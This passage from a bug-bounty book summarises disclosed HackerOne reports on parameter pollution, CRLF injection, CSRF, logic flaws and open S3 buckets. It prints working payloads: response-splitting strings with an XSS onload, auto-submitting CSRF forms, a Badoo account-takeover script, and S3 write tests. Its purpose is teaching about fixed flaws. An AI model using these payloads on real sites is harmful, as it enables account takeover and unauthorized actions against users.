+Report Link: merttasci.com/blog/twitter-hpp-vulnerability2
+Date Reported: August 23, 2015
+Bounty Paid: $700
+Description:
+In August 2015, hacker Mert Tasci noticed an interesting URL when unsubscribing from
+receiving Twitter notifications:
+https://twitter.com/i/u?t=1&cn=bWV&sig=657&iid=F6542&uid=1134885524&nid=22+26
+(I’ve shortened this a bit for the book). Did you notice the parameter UID? This happens
+to be your Twitter account user ID. Now, noticing that, he did what I assume most of
+us hackers would do, he tried changing the UID to that of another user and ... nothing.
+Twitter returned an error.
+Determined where others may have given up, Mert tried adding a second uid parameter
+so the URL looked like (again I shortened this):
+2
+
+http://www.merttasci.com/blog/twitter-hpp-vulnerability
+
+HTTP Parameter Pollution
+
+23
+
+https://twitter.com/i/u?iid=F6542&uid=2321301342&uid=1134885524&nid=22+26
+and ... SUCCESS! He managed to unsubscribe another user from their email notifications.
+Turns out, Twitter was vulnerable to HPP unsubscribing users.
+Takeaways
+Though a short description, Mert’s efforts demonstrate the importance of persistence and knowledge. If he had walked away from the vulnerability after
+testing another UID as the only parameter or had he not know about HPP type
+vulnerabilities, he wouldn’t have received his $700 bounty.
+Also, keep an eye out for parameters, like UID, being included in HTTP requests
+as I’ve seen a lot of reports during my research which involve manipulating their
+values and web applications doing unexpected things.
+
+3. Twitter Web Intents
+Difficulty: Low
+Url: twitter.com
+Report Link: Parameter Tamperting Attack on Twitter Web Intents3
+Date Reported: November 2015
+Bounty Paid: Undisclosed
+Description:
+According to their documentation, Twitter Web Intents, provide popup-optimized flows
+for working with Tweets & Twitter Users: Tweet, Reply, Retweet, Like, and Follow. They
+make it possible for users to interact with Twitter content in the context of your site,
+without leaving the page or having to authorize a new app just for the interaction. Here’s
+an example of what this looks like:
+3
+
+https://ericrafaloff.com/parameter-tampering-attack-on-twitter-web-intents
+
+24
+
+HTTP Parameter Pollution
+
+Twitter Intent
+
+Testing this out, hacker Eric Rafaloff found that all four intent types, following a user,
+liking a tweet, retweeting and tweeting, were vulnerable to HPP.
+According to his blog post, if Eric created a URL with two screen_name parameters:
+https://twitter.com/intent/follow?screen_name=twitter&scnreen_name=erictest3
+Twitter would handle the request by giving precedence to the second screen_name over
+the first. According to Eric, the web form looked like:
+
+HTTP Parameter Pollution
+
+25
+
+<form class="follow " id="follow_btn_form" action="/intent/follow?screen_name=er\
+icrtest3" method="post">
+<input type="hidden" name="authenticity_token" value="...">
+<input type="hidden" name="screen_name" value="twitter">
+<input type="hidden" name="profile_id" value="783214">
+<button class="button" type="submit" >
+<b></b><strong>Follow</strong>
+</button>
+</form>
+
+A victim would see the profile of the user defined in the first screen_name, twitter, but
+clicking the button, they’d end up following erictest3.
+Similarly, when presenting intents for liking, Eric found he could include a screen_name
+parameter despite it having no relevance to liking the tweet. For example:
+https://twitter.com/intent/like?tweet_id=6616252302978211845&screen_name=erictest3
+Liking this tweet would result in a victim being presented with the correct owner profile
+but clicking follow, they would again end up following erictest3.
+Takeaways
+This is similar to the previous Twitter vulnerability regarding the UID. Unsurprisingly, when a site is vulnerable to an flaw like HPP, it may be indicative of a
+broader systemic issue. Sometimes if you find a vulnerability like this, it’s worth
+taking the time to explore the platform in its entirety to see if there are other
+areas where you might be able to exploit similar behaviour. In this example, like
+the UID above, Twitter was passing a user identifier, screen_name which was
+susceptible to HPP based on their backend logic.
+
+Summary
+The risk posed by HTTP Parameter Pollution is really dependent on the actions performed
+by a site’s back end and where the polluted parameters are being submitted to.
+Discovering these types of vulnerabilities really depends on experimentation, more so
+than other vulnerabilities because the back end actions of a website may be a complete
+black box to a hacker. More often than not, as a hacker, you will have very little insight
+into what actions a back end server takes after having received your input.
+Through trial and error, you may be able to discover situations where a site is communicating with another server and then start testing for Parameter Pollution. Social media
+
+HTTP Parameter Pollution
+
+26
+
+links are usually a good first step but remember to keep digging and think of HPP when
+you might be testing for parameter substitutions like UIDs.
+
+7. CRLF Injection
+Description
+Carriage Return Line Feed (CRLF) Injection is a type of vulnerability that occurs when a
+user manages to insert a CRLF into an application. The CRLF characters represent an end
+of line for many internet protocols, including HTML, and are %0D%0A which decoded
+represent \r\n. These can be used to denote line breaks and when combined with HTTP
+Request / Response Headers, can lead to different vulnerabilities, including HTTP Request
+Smuggling and HTTP Response Splitting.
+In terms of HTTP Request Smuggling, this usually occurs when an HTTP request is passed
+through a server which processes it and passes it to another server, like a proxy or
+firewall. This type of vulnerability can result in:
+• Cache poisoning, a situation where an attacker can change entries in the cache and
+serves malicious pages (e.g., containing javascript) instead of the proper page
+• Firewall evasion, a situation where a request can be crafted to avoid security checks,
+typically involving CRLF and overly large request bodies
+• Request Hijacking, a situation where an attacker can steal HttpOnly cookies and
+HTTP authentication information. This is similar to XSS but requires no interaction
+between the attacker and client
+Now, while these vulnerabilities exist, they are difficult to achieve. I’ve referenced them
+here so you have an understanding of how severe Request Smuggling can be.
+With regards to HTTP Response Splitting, attackers can set arbitrary response headers,
+control the body of the response or split the response entirely providing two responses
+instead of one as demonstrated in Example #2 - v.shopify.com Response Splitting (if you
+need a reminder on HTTP request and response headers, flip back to the Background
+chapter).
+
+1. Twitter HTTP Response Splitting
+Difficulty: High
+Url: https://twitter.com/i/safety/report_story
+Report Link: https://hackerone.com/reports/520421
+1
+
+https://hackerone.com/reports/52042
+
+27
+
+CRLF Injection
+
+28
+
+Date Reported: April 21, 2015
+Bounty Paid: $3,500
+Description:
+In April 2015, it was reported that Twitter had a vulnerability which allowed hackers to
+set an arbitrary cookie by tacking on additional information to the request to Twitter.
+Essentially, after making the request to the URL above (a relic of Twitter’s which allowed
+people to report ads), Twitter would return a cookie for the parameter reported_tweet_id.
+However, according to the report, Twitter’s validation confirming whether the Tweet was
+numeric was flawed.
+While Twitter validated that the new line character, 0x0a, could not be submitted, the
+validation could be bypassed by encoding the characters as UTF-8 characters. In doing
+so, Twitter would convert the characters back to the original unicode thereby avoiding
+the filter. Here’s the example provided:
+%E5%E98%8A => U+560A => 0A
+
+This is significant because, new line characters are interpreted on the server as doing
+just that, creating a new line which the server reads and executes, in this case to tack on
+a new cookie.
+Now, CLRF attacks can be even more dangerous when they allow for XSS attacks (see
+the Cross-Site Scripting chapter for more info). In this case, because Twitter filters were
+bypassed, a new response could be returned to the user which included an XSS attack.
+Here’s the URL:
+https://twitter.com/login?redirect_after_login=https://twitter.com:21/%E5%98%8A%\
+E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%9\
+8%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
+
+Notice the %E5%E98%8A peppered throughout it. If we take those characters out and
+actually add line breaks, here’s what the header looks like:
+https://twitter.com/login?redirect_after_login=https://twitter.com:21/
+content-type:text/html
+location:%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
+
+As you can see, the line breaks allow for the creation of a new header to be returned with
+executable Javascript code - svg/onload=alert(innerHTML). With this code, a malicious
+user could steal an unsuspecting victim’s Twitter session information.
+
+29
+
+CRLF Injection
+
+Takeaways
+Good hacking is a combination of observation and skill. In this case, the reporter,
+@filedescriptor, knew of a previous Firefox encoding bug which mishandled
+encoding. Drawing on that knowledge led to testing out similar encoding on
+Twitter to get line returns inserted.
+When you are looking for vulnerabilities, always remember to think outside the
+box and submit encoded values to see how the site handles the input.
+
+2. v.shopify.com Response Splitting
+Difficulty: Medium
+Url: v.shopify.com/last_shop?x.myshopify.com
+Report Link: https://hackerone.com/reports/1064272
+Date Reported: December 22, 2015
+Bounty Paid: $500
+Description:
+Shopify includes some behind the scenes functionality that will set a cookie on your
+browser pointing to the last store you have logged into. It does that via the endpoint,
+/last_shop?SITENAME.shopify.com
+In December 2015, it was discovered that Shopify wasn’t validating the shop parameter
+being passed into the call. As a result, using Burp Suite, a White Hat was able to alter the
+request with %0d%0a and generate a header returned to the user. Here’s a screenshot:
+
+Shopify HTTP Response Splitting
+
+Here’s the malicious code:
+
+2
+
+https://hackerone.com/reports/106427
+
+CRLF Injection
+
+30
+
+%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20te\
+xt/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>deface</html>
+
+In this case, the %20 represents a space and %0d%0a is a CRLF. As a result, the browser
+received two headers and rendered the second which could have led to a variety of
+vulnerabilities, including XSS.
+Takeaways
+Be on the lookout for opportunities where a site is accepting your input and
+using it as part of its return headers. In this case, Shopify creates a cookie
+with last_shop value which was actually pulled from a user controllable URL
+parameter. This is a good signal that it might be possible to expose a CRLF
+injection vulnerability.
+
+Summary
+Good hacking is a combination of observation and skill. Knowing how encoded characters
+can be used to expose vulnerabilities is a great skill to have. %0D%0A can be used to test
+servers and determine whether they may be vulnerability to a CRLF Injection. If it is, take
+it a step further and try to combine the vulnerability with an XSS injection (covered in
+Section 7).
+On the other hand, if the server doesn’t respond to %0D%0A think about how you could
+encode those characters again and test the server to see if it will decode the doubled
+encoded characters just like @filedescriptor did.
+Be on the lookout for opportunities where a site is using a submitted value to return
+some type of header, like creating a cookie.
+
+8. Cross-Site Request Forgery
+Description
+A Cross-Site Request Forgery, or CSRF, attack occurs when a malicious website, email,
+instant message, application, etc. causes a user’s web browser to perform some action
+on another website where that user is already authenticated, or logged in. Often this
+occurs without the user knowing the action has occurred.
+The impact of a CSRF attack depends on the website which is receiving the action. Here’s
+an example:
+1. Bob logs into his bank account, performs some banking but does not log out.
+2. Bob checks his email and clicks a link to an unfamiliar website.
+3. The unfamiliar website makes a request to Bob’s banking website to transfer money
+passing in cookie information stored from Bob’s banking session in step 1.
+4. Bob’s banking website receives the request from the unfamiliar (malicious) website,
+without using a CSRF token and processes the transfer.
+Even more interesting is the idea that the link to the malicious website could be contained
+in valid HTML which does not require Bob to click on the link, <img src=”www.malicious_site.com”>. If Bob’s device (i.e., browser) renders this image, it will make the request to
+malicious_site.com and potentially kick off the CSRF attack.
+Now, knowing the dangers of CSRF attacks, they can be mitigated a number of ways,
+perhaps the most popular is a CSRF token which must be submitted with potentially
+data altering requests (i.e., POST requests). Here, a web application (like Bob’s bank)
+would generate a token with two parts, one which Bob would receive and one which the
+application would retain.
+When Bob attempts to make transfer requests, he would have to submit the token which
+the bank would then validate with its side of the token.
+Now, with regards to CSRF and CSRF tokens, it seems like Cross Origin Resource Sharing
+(CORS) is becoming more common, or I’m just noticing it more as I explore more targets.
+Essentially, CORS restricts resources, including json responses, from being accessed by
+a domain outside of that which served the file. In other words, when CORS is used to
+protect a site, you can’t write Javascript to call the target application, read the response
+and make another call, unless the target site allows it.
+31
+
+Cross-Site Request Forgery
+
+32
+
+If this seems confusing, with Javascript, try calling HackerOne.com/activity.json, reading
+the response and making a second call. You’ll also see the importance of it and potential
+work arounds in Example #3 below.
+Lastly, it’s important to note (thanks to Jobert Abma for flagging), that not every request
+without as CSRF token is a valid CSRF issue. Some websites may perform additional
+checks like comparing the referrer header (though this isn’t foolproof and there have
+been cases where this was bypassed). This is a field that identifies the address of the
+webpage that linked to the resource being requested. In other words, if the referrer on a
+POST call is not from the same site receiving the HTTP request, the site may disallow the
+call thereby achieving the same effect as validating a CSRF token. Additionally, not every
+site refers to or users the term csrf when creating or defining a token. For example, on
+Badoo it is the rt parameter as discussed below.
+Links
+Check out the OWASP testing guide at OWASP Testing for CSRF1
+
+Examples
+1. Shopify Export Installed Users
+Difficulty: Low
+Url: https://app.shopify.com/services/partners/api_clients/XXXX/export_installed_users
+Report Link: https://hackerone.com/reports/964702
+Date Reported: October 29, 2015
+Bounty Paid: $500
+Description:
+Shopify’s API provides an endpoint for exporting a list of installed users, via the URL
+provided above. A vulnerability existed where a website could call that Endpoint and
+read in information as Shopify did not include any CSRF token validation to that call.
+As a result, the following HTML code could be used to submit the form on behalf of an
+unknowing victim:
+
+1
+2
+
+https://www.owasp.org/index.php/Testing_for_CSRF_(OTG-SESS-005)
+https://hackerone.com/reports/96470
+
+Cross-Site Request Forgery
+
+33
+
+<html>
+<head><title>csrf</title></head>
+<body onLoad="document.forms[0].submit()">
+<form action="https://app.shopify.com/services/partners/api_clients/1105664/\
+export_installed_users" method="GET">
+</form>
+</body>
+</html>
+
+Here, by just visiting the site, Javascript submits the form which actually includes a GET
+call to Shopify’s API with the victim’s browser supplying its cookie from Shopify.
+Takeaways
+Broaden your attack scope and look beyond a site’s website to its API endpoints.
+APIs offer great potential for vulnerabilities so it is best to keep both in mind,
+especially when you know that an API may have been developed or made
+available for a site well after the actual website was developed.
+
+2. Shopify Twitter Disconnect
+Difficulty: Low
+Url: https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect
+Report Link: https://hackerone.com/reports/1112163
+Date Reported: January 17, 2016
+Bounty Paid: $500
+Description:
+Shopify provides integration with Twitter to allow shop owners to tweet about their
+products. Similarly, it also provides functionality to disconnect a Twitter account from
+a connected shop.
+The URL to disconnect a Twitter account is referenced above. When making the call,
+Shopify did not validate the CSRF token which would have allowed a malicious person
+to make a GET call on the victim’s behalf, thereby disconnecting the victim’s store from
+Twitter.
+In providing the report, WeSecureApp provided the following example of a vulnerable
+request - note the use of an img tag below which makes the call to the vulnerable URL:
+3
+
+https://hackerone.com/reports/111216
+
+Cross-Site Request Forgery
+
+34
+
+GET /auth/twitter/disconnect HTTP/1.1
+Host: twitter-commerce.shopifyapps.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:43.0) Gecko/2010010\
+1 Firefox/43.0
+Accept: text/html, application/xhtml+xml, application/xml
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://twitter-commerce.shopifyapps.com/account
+Cookie: _twitter-commerce_session=REDACTED
+>Connection: keep-alive
+
+Since the browser performs a GET request to get the image at the given URL and no CSRF
+token is validated, a user’s store is now disconnected:
+<html>
+<body>
+<img src="https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect">
+</body>
+</html>
+
+Takeaways
+In this situation, this vulnerability could have been found by using a proxy server,
+like Burp or Firefox’s Tamper Data, to look at the request being sent to Shopify
+and noting that this request was being performed with by way of a GET request.
+Since this was destructive action and GET requests should never modify any data
+on the server, this would be a something to look into.
+
+3. Badoo Full Account Takeover
+Difficulty: Medium
+Url: https://badoo.com
+Report Link: https://hackerone.com/reports/1277034
+Date Reported: April 1, 2016
+Bounty Paid: $852
+Description:
+4
+
+https://hackerone.com/reports/127703
+
+Cross-Site Request Forgery
+
+35
+
+If you check Badoo out, you’ll realize that they protect against CSRF by including a URL
+parameter, rt, which is only 5 digits long (at least at the time of writing). While I noticed
+this when Badoo went live on HackerOne, I couldn’t find a way to exploit this. However,
+Mahmoud Jamal (zombiehelp54) did.
+Recognizing the rt parameter and its value, he also noticed that the parameter was
+returned in almost all json responses. Unfortunately this wasn’t helpful as Cross Origin
+Resource Sharing (CORS) protects Badoo from attackers reading those responses. So
+Mahmoud kept digging.
+Turns out, the file https://eu1.badoo.com/worker-scope/chrome-service-worker.js contained the
+rt value. Even better is this file can be read arbitrarily by an attacker without needing the
+victim to do anything except visit the malicious web page. Here’s the code he provided:
+<html>
+<head>
+<title>Badoo account take over</title>
+<script src=https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1></s\
+cript>
+</head>
+<body>
+<script>
+function getCSRFcode(str) {
+return str.split('=')[2];
+}
+window.onload = function(){
+var csrf_code = getCSRFcode(url_stats);
+csrf_url = 'https://eu1.badoo.com/google/verify.phtml?code=4/nprfspM3yfn2SFUBear\
+08KQaXo609JkArgoju1gZ6Pc&authuser=3&session_state=7cb85df679219ce71044666c7be3e0\
+37ff54b560..a810&prompt=none&rt='+ csrf_code;
+window.location = csrf_url;
+};
+</script>
+
+Essentially, when a victim loads this page, it will call the Badoo script, take the rt
+parameter for the user and then make a call on the victim’s behalf. In this case, it was to
+link Mahmoud’s account with the victim’s, essentially completing an account take over.
+
+Cross-Site Request Forgery
+
+36
+
+Takeaways
+Where there is smoke, there’s fire. Here, Mahmoud noticed that the rt parameter
+was being returned in different locations, in particular json responses. Because
+of that, he rightly guessed it may show up somewhere that could be exploited in this case a js file.
+Going forward, if you feel like something is off, keep digging. Using Burp, check
+all the resources that are being called when you visit a target site / application.
+
+Summary
+CSRF represent another vector for attack and may be executed without a victim even
+knowing or actively performing an action. Finding CSRF vulnerabilities may take some
+ingenuity and again, a desire to test everything.
+Generally, web forms are uniformly protected by application frameworks like Rails if the
+site is performing a POST request but APIs can be a different story. For example, Shopify
+is written primarily using the Ruby on Rails framework which provides CSRF protection
+for all forms by default (though it can be turned off). However, clearly this isn’t necessarily
+the case for API’s created with the framework. Lastly, be on the lookout for any calls which
+change server data (like delete actions) which are being performed by a GET request.
+
+9. Application Logic Vulnerabilities
+Description
+Application logic vulnerabilities are different from the other types we’ve been discussing
+thus far. Whereas HTML Injection, HTML Parameter Pollution and XSS all involve submitting some type of potentially malicious input, application logic vulnerabilities really
+involve manipulating scenarios and exploiting bugs in the web app coding.
+A notable example of this type of attack was pulled off by Egor Homakov against GitHub
+which uses Ruby on Rails. If you’re unfamiliar with Rails, it is a very popular web
+framework which takes care of a lot of the heavy lifting when developing a web site.
+In March 2012, Egor flagged for the Rails Community that by default, Rails would accept
+all parameters submitted to it and use those values in updating database records
+(dependent on the developers implementation). The thinking by Rails core developers
+was that web developers using Rails should be responsible for closing this security
+gap and defining which values could be submitted by a user to update records. This
+behaviour was already well known within the community but the thread on GitHub shows
+how few appreciated the risk this posed https://github.com/rails/rails/issues/52281 .
+When the core developers disagreed with him, Egor went on to exploit an authentication
+vulnerability on GitHub by guessing and submitting parameter values which included
+a creation date (not overly difficult if you have worked with Rails and know that most
+records include a created and updated column in the database). As a result, he created a
+ticket on GitHub with the date years in the future. He also managed to update SSH access
+keys which permitted him access to the official GitHub code repository.
+As mentioned, the hack was made possible via the back end GitHub code which did not
+properly authenticate what Egor was doing, i.e, that he should not have had permission
+to submit values for the creation date, which subsequently were used to update database
+records. In this case, Egor found what was referred to as a mass assignment vulnerability.
+Application logic vulnerabilities are a little trickier to find compared to previous types of
+attacks discussed because they rely on creative thinking about coding decisions and are
+not just a matter of submitting potentially malicious code which developers don’t escape
+(not trying to minimize other vulnerability types here, some XSS attacks are beyond
+complex!).
+With the example of GitHub, Egor knew that the system was based on Rails and how
+Rails handled user input. In other examples, it may be a matter of making direct API calls
+1
+
+https://github.com/rails/rails/issues/5228
+
+37
+
+Application Logic Vulnerabilities
+
+38
+
+programmatically to test behaviour which compliments a website as seen with Shopify’s
+Administrator Privilege Bypass below. Or, it’s a matter of reusing returned values from
+authenticated API calls to make subsequent API calls which you should not be permitted
+to do.
+
+Examples
+1. Shopify Administrator Privilege Bypass
+Difficulty: Low
+Url: shop.myshopify.com/admin/mobile_devices.json
+Report Link: https://hackerone.com/reports/1009382
+Date Reported: November 22, 2015
+Bounty Paid: $500
+Description:
+Shopify is a huge and robust platform which includes both a web facing UI and
+supporting APIs. In this example, the API did not validate some permissions which the
+web UI apparently did. As a result, store administrators, who were not permitted to
+receive email notifications for emails, could bypass that security setting by manipulating
+the API endpoint to receive notifications to their Apple devices.
+According to the report, the hacker would just have to:
+• Log in to the Shopify phone app with a full access account
+• Intercept the request to POST /admin/mobile_devices.json
+• Remove all permissions of that account.
+• Remove the mobile notification added.
+• Replay the request to POST /admin/mobile_devices.json
+After doing so, that user would receive mobile notifications for all orders placed to the
+store thereby ignoring the store’s configured security settings.
+Takeaways
+There are two key take aways here. First, not everything is about injecting code,
+HTML, etc. Always remember to use a proxy and watch what information is being
+passed to a site and play with it to see what happens. In this case, all it took was
+removing POST parameters to bypass security checks. Secondly, again, not all
+attacks are based on HTML webpages. API endpoints always present a potential
+area for vulnerability so make sure you consider and test both.
+2
+
+https://hackerone.com/reports/100938
+
+Application Logic Vulnerabilities
+
+39
+
+2. Starbucks Race Conditions
+Difficulty: Medium
+Url: Starbucks.com
+Report Link: http://sakurity.com/blog/2015/05/21/starbucks.html3
+Date Reported: May 21, 2015
+Bounty Paid: $0
+Description:
+If you aren’t familiar with race conditions, essentially, it boils down to two potential
+processes competing to complete against each other based on an initial situation which
+becomes invalid while the requests are being executed. In other words, it’s a situation
+where you have two processes which should be mutually exclusive, unable to both
+complete, but because they occur near simultaneously, they are permitted to do so.
+Here’s an example,
+1. You log into your banking website on your phone and request a transfer of $500
+from one account with only $500 in it, to another account.
+2. The request is taking too long (but is still processing) so you log in on your laptop
+and make the same request again.
+3. The laptop request finishes almost immediately but so too does your phone.
+4. You refresh your bank accounts and see that you have $1000 in your account. This
+means the request was processed twice which should not have been permitted
+because you only had $500 to start.
+While this is overly basic, the notion is the same, some condition exists to begin a request
+which, when completed, no longer exists.
+So, back to this example, Egor tested transferring money from one Starbucks card and
+found that he could successfully invoke race conditions. The requests were created near
+simultaneously using the cURL program.
+Takeaways
+Race conditions are an interesting vulnerability vector that can sometimes exist
+where applications are dealing with some type of balance, like money, credits,
+etc. Finding the vulnerability doesn’t always happen on the first attempt and
+may requiring making several repeated simultaneous requests. Here, Egor made
+6 requests before being successful. But remember when testing this to be
+respectful of traffic load and avoid hammering a site with continuous testing
+requests.
+3
+
+http://sakurity.com/blog/2015/05/21/starbucks.html
+
+Application Logic Vulnerabilities
+
+40
+
+3. Binary.com Privilege Escalation
+Difficulty: Low
+Url: binary.com
+Report Link: https://hackerone.com/reports/982474
+Date Reported: November 14, 2015
+Bounty Paid: $300
+Description:
+This is really a straight forward vulnerability which doesn’t need much explanation.
+In essence, in this situation, a user was able to login to any account and view sensitive
+information, or perform actions, on behalf of the hacked user account and all that was
+required was knowing a user’s account ID.
+Before the hack, if you logged into Binary.com/cashier and inspected the page HTML,
+you’d notice an <iframe> tag which included a PIN parameter. That parameter was
+actually your account ID.
+Next, if you edited the HTML and inserted another PIN, the site would automatically
+perform an action on the new account without validating the password or any other
+credentials. In other words, the site would treat you as the owner of the account you
+just provided.
+Again, all that was required was knowing someone’s account number. You could even
+change the event occurring in the iframe to PAYOUT to invoke a payment action to
+another account. However, Binary.com indicates that all withdraws require manual
+human review but that doesn’t necessarily mean it would have been caught�
+Takeaways
+If you’re looking for authentication based vulnerabilities, be on the lookout for
+where credentials are being passed to a site. While this vulnerability was caught
+by looking at the page source code, you also could have noticed the information
+being passed when using a Proxy interceptor.
+If you do find some type of credentials being passed, take note when they do not
+look encrypted and try to play with them. In this case, the pin was just CRXXXXXX
+while the password was 0e552ae717a1d08cb134f132� clearly the PIN was not
+encrypted while the password was. Unencrypted values represent a nice area to
+start playing with.
+
+4
+
+https://hackerone.com/reports/98247
+
+Application Logic Vulnerabilities
+
+41
+
+4. HackerOne Signal Manipulation
+Difficulty: Low
+Url: hackerone.com/reports/XXXXX
+Report Link: https://hackerone.com/reports/1063055
+Date Reported: December 21, 2015
+Bounty Paid: $500
+Description:
+At the end of 2015, HackerOne introduced new functionality to the site called Signal.
+Essentially, it helps to identify the effectiveness of a Hacker’s previous vulnerability
+reports once those reports are closed. It’s important to note here, that users can close
+their own reports on HackerOne which is supposed to result in no change for their
+Reputation and Signal�
+So, as you can probably guess, in testing the functionality out, a hacker discovered that
+the functionality was improperly implemented and allowed for a hacker to create a
+report to any team, self close the report and receive a Signal boost.
+And that’s all there was to it�
+Takeaways
+Though a short description, the takeaway here can’t be overstated, be on the
+lookout for new functionality!. When a site implements new functionality, it’s
+like fresh meat for hackers. New functionality represents the opportunity to test
+new code and search for bugs. This was the same for the Shopify Twitter CSRF
+and Facebook XSS vulnerabilities. To make the most of this, it’s a good idea to
+familiarize yourself with companies and subscribe to company blogs so you’re
+notified when something is released. Then test away.
+
+5. Shopify S3 Buckets Open
+Difficulty: Medium
+Url: cdn.shopify.com/assets
+Report Link: https://hackerone.com/reports/1063056
+Date Reported: November 9, 2015
+Bounty Paid: $1000
+5
+6
+
+https://hackerone.com/reports/106305
+https://hackerone.com/reports/106305
+
+Application Logic Vulnerabilities
+
+42
+
+Description:
+Amazon Simple Storage, S3, is a service that allows customers to store and serve files
+from Amazon’s cloud servers. Shopify, and many sites, use S3 to store and serve static
+content like images.
+The entire suite of Amazon Web Services, AWS, is very robust and includes a permission
+management system allowing administrators to define permissions, per service, S3
+included. Permissions include the ability to create S3 buckets (a bucket is like a storage
+folder), read from buckets and write to buckets, among many others.
+According to the disclosure, Shopify didn’t properly configure their S3 buckets permissions and inadvertently allowed any authenticated AWS user to read or write to their
+buckets. This is obviously problematic because you wouldn’t want malicious black hats
+to use your S3 buckets to store and serve files, at a minimum.
+Unfortunately, the details of this ticket weren’t disclosed but it’s likely this was discovered
+with the AWS CLI, a toolkit which allows you to interact with AWS services from your
+command line. While you would need an AWS account to do this, creating one is actually
+free as you don’t need to enable any services. As a result, with the CLI, you could
+authenticate yourself with AWS and then test out the access (This is exactly how I found
+the HackerOne bucket listed below).
+Takeaways
+When you’re scoping out a potential target, ensure to note all the different tools,
+including web services, they appear to be using. Each service, software, OS, etc.
+you can find reveals a potential new attack vector. Additionally, it is a good idea
+to familiarize yourself with popular web tools like AWS S3, Zendesk, Rails, etc.
+that many sites use.
+
+6. HackerOne S3 Buckets Open
+Difficulty: Medium
+Url: [REDACTED].s3.amazonaws.com
+Report Link: https://hackerone.com/reports/1280887
+Date Reported: April 3, 2016
+Bounty Paid: $2,500
+Description:
+7
+
+https://hackerone.com/reports/128088
+
+Application Logic Vulnerabilities
+
+43
+
+We’re gonna do something a little different here. This is a vulnerability that I actually
+discovered and it’s a little different from Shopify bug described above so I’m going to
+share everything in detail about how I found this.
+So, to begin with, the vulnerability described above was for a bucket which was publicly
+linked with Shopify. Meaning, when you visited your store, you would see calls to
+Amazon’s S3 service so the hacker knew which bucket to target. I didn’t - I found the
+bucket that I hacked with a cool script and some ingenuity.
+During the weekend of April 3, I don’t know why but I decided to try and think outside of
+the box and attack HackerOne. I had been playing with their site since the beginning and
+kept kicking myself in the ass every time a new vulnerability with information disclosure
+was found, wondering how I missed it. I wondered if their S3 bucket was vulnerable like
+Shopify. I also kept wondering how the hacker accessed the Shopify bucket� I figured
+it had to be using the Amazon Command Line Tools.
+Now, normally I would have stopped myself figuring there was no way HackerOne was
+vulnerable after all this time. But one of the many things which stuck out to me from my
+interview with Ben Sadeghipour (@Nahamsec) was to not doubt myself or the ability for
+a company to make mistakes.
+So I searched Google for some details and came across two interesting pages:
+There’s a Hole in 1,951 Amazon S3 Buckets8
+S3 Bucket Finder9
+The first is an interesting article from Rapid7, a security company, which talks about how
+they discovered S3 buckets that were publicly writable and did it with fuzzing, or guessing
+the bucket name.
+The second is a cool tool which will take a wordlist and call S3 looking for buckets�
+However, it doesn’t come with its own list. But there was a key line in the Rapid7 article,
+“�Guessing names through a few different dictionaries� List of Fortune 1000 company
+names with permutations on .com, -backup, -media�
+This was interesting. I quickly created a list of potential bucket names for HackerOne like
+hackerone, hackerone.marketing, hackerone.attachments, hackerone.users,
+hackerone.files, etc.
+None of these are the real bucket - they redacted it from the report so I’m honouring
+that though I’m sure you might be able to find it too. I’ll leave that for a challenge.
+Now, using the Ruby script, I started calling the buckets. Right away things didn’t look
+good. I found a few buckets but access was denied. No luck so I walked away and watched
+NetFlix.
+8
+9
+
+https://community.rapid7.com/community/infosec/blog/2013/03/27/1951-open-s3-buckets
+https://digi.ninja/projects/bucket_finder.php
+
+Application Logic Vulnerabilities
+
+44
+
+But this idea was bugging me. So before going to bed, I decided to run the script again
+with more permutations. I again found a number of buckets that looked like they could
+be HackerOne’s but all were access denied. I realized access denied at least told me the
+bucket existed.
+I opened the Ruby script and realized it was calling the equivalent of the ls function on
+the buckets. In other words, it was trying to see if they were publicly readable - I wanted
+to know that AND if they were publicly WRITABLE.
+Now, as an aside, AWS provides a Command Line tool, aws-cli. I know this because I’ve
+used it before, so a quick sudo apt-get aws-cli on my VM and I had the tools. I set them
+up with my own AWS account and was ready to go. You can find instructions for this at
+docs.aws.amazon.com/cli/latest/userguide/installing.html
+Now, the command aws s3 help will open the S3 help and detail the available commands,
+something like 6 at the time of writing this. One of those is mv in the form of aws s3 mv
+[FILE] [s3://BUCKET]. So in my case I tried:
+touch test.txt
+aws s3 mv test.txt s3://hackerone.marketing
+
+This was the first bucket which I received access denied for AND� “move failed: ./test.txt
+to s3://hackerone.marketing/test.txt A client error (AccessDenied) occurred when calling
+the PutObject operation: Access Denied.”
+So I tried the next one aws s3 mv test.txt s3://hackerone.files AND� SUCCESS! I got
+the message “move: ./test.txt to s3://hackerone.files/test.txt”
+Amazing! Now I tried to delete the file: aws s3 rm s3://hackerone.files/test.txt AND
+again, SUCCESS!
+But now the self-doubt. I quickly logged into HackerOne to report and as I typed, I
+realized I couldn’t actually confirm ownership of the bucket� AWS S3 allows anyone to
+create any bucket in a global namespace. Meaning, you, the reader, could have actually
+owned the bucket I was hacking.
+I wasn’t sure I should report without confirming. I searched Google to see if I could find
+any reference to the bucket I found� nothing. I walked away from the computer to clear
+my head. I figured, worst thing, I’d get another N/A report and -5 rep. On the other hand,
+I figured this was worth at least $500, maybe $1000 based on the Shopify vulnerability.
+I hit submit and went to bed. When I woke up, HackerOne had responded congratulating
+the find and saying they had already fixed it and a few other buckets that were vulnerable.
+Success! And to their credit, when they awarded the bounty, they factored in the potential
+severity of this, including the other buckets I didn’t find but that were vulnerable.
+
+Application Logic Vulnerabilities
+
+45
+
+Takeaways
+There are a multiple takeaways from this:
+1. Don’t underestimate your ingenuity and the potential for errors from
+developers. HackerOne is an awesome team of awesome security researchers. But people make mistakes. Challenge your assumptions.
+2. Don’t give up after the first attempt. When I found this, browsing each
+bucket wasn’t available and I almost walked away. But then I tried to write
+a file and it worked.
+3. It’s all about the knowledge. If you know what types of vulnerabilities exist,
+you know what to look for and test. Buying this book was a great first step.
+4. I’ve said it before, I’ll say it again, an attack surface is more than the
